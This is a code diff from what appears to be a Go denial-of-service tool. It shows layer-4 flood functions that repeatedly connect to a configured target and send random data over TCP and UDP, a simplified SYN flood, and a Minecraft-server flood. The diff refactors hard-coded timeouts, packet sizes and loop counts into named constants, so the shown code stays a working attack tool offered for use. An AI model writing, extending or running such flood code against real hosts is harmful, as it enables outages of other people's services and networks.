@@ -50,7 +50,7 @@ func RunLayer4Attack(cfg *Layer4Config, wg *sync.WaitGroup, stopChan chan struct
 
 	// Work producer - fills the work channel
 	go func() {
-		ticker := time.NewTicker(1 * time.Millisecond)
+		ticker := time.NewTicker(WorkerTickInterval)
 		defer ticker.Stop()
 
 		for {
@@ -121,13 +121,13 @@ func executeLayer4Method(cfg *Layer4Config, requestsSent, bytesSent *utils.Count
 
 func executeTCP(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
 	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
-	conn, err := net.DialTimeout("tcp", target, 1*time.Second)
+	conn, err := net.DialTimeout("tcp", target, DefaultDialTimeout)
 	if err != nil {
 		return
 	}
 	defer conn.Close()
 
-	data := utils.RandomBytes(1024)
+	data := utils.RandomBytes(DefaultPacketSize)
 	for {
 		n, err := conn.Write(data)
 		if err != nil {
@@ -151,8 +151,8 @@ func executeUDP(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
 	}
 	defer conn.Close()
 
-	data := utils.RandomBytes(1024)
-	for range 100 {
+	data := utils.RandomBytes(DefaultPacketSize)
+	for range DefaultUDPIterations {
 		n, err := conn.Write(data)
 		if err != nil {
 			break
@@ -166,8 +166,8 @@ func executeSYN(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
 	// SYN flood requires raw sockets which need root/admin privileges
 	// This is a simplified version
 	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
-	for range 10 {
-		conn, err := net.DialTimeout("tcp", target, 100*time.Millisecond)
+	for range DefaultSYNIterations {
+		conn, err := net.DialTimeout("tcp", target, SYNDialTimeout)
 		if err == nil {
 			conn.Close()
 			requestsSent.Add(1)
@@ -177,7 +177,7 @@ func executeSYN(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
 
 func executeMINECRAFT(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
 	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
-	conn, err := net.DialTimeout("tcp", target, 1*time.Second)
+	conn, err := net.DialTimeout("tcp", target, DefaultDialTimeout)
 	if err != nil {
 		return
 	}
